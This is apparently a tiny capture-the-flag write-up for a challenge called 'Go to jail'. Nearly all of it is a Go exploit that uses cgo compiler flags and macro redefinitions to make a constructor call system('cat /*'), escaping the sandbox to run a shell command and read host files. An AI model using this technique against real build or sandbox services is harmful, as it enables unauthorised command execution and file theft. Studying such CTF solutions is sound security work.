### Go to jail

Our exploit:

```go
package main
/*#cgo CFLAGS:-D__artificial__=constructor -D__inline=
#define __builtin_ia32_clzero __I="cat /*";system
#include<clzerointrin.h>*/
import "C"
func main(){}
```
